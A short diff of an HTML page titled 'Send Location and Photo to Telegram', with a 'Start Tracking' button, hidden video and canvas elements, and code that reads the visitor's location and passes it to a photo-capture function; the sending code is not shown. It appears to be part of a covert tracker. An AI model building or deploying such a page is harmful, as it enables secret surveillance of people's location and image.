@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location and Photo Tracker</title>
+    <title>test one</title>
 </head>
 <body>
-    <h1>momo </h1>
+    <h1>Send Location and Photo to Telegram</h1>
     <button id="start">Start Tracking</button>
     <video id="video" autoplay style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
@@ -22,7 +22,6 @@
                     locationInput.latitude = latitude;
                     locationInput.longitude = longitude;
 
-                    console.log("Location:", locationInput); // Debugging
                     capturePhoto(locationInput);
                 }, error => {
                     alert("Unable to access location.");
